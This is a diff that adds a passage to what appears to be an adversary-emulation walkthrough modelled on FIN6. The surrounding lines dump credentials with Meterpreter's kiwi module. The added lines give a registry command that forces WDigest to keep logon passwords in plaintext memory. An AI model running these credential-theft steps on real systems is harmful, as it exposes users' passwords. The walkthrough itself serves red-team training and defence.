@@ -297,6 +297,18 @@ meterpreter > load kiwi
 meterpreter > creds_all
 ```
 
+Note the password field is null.
+
+As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer  Windows versions. 
+
+It is still possible, however, to force WDigest to store secrets in plaintext.
+
+Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:
+
+```ps
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+```
+
 FIN6
 
 ## Step 4 - Collection and Exfiltration
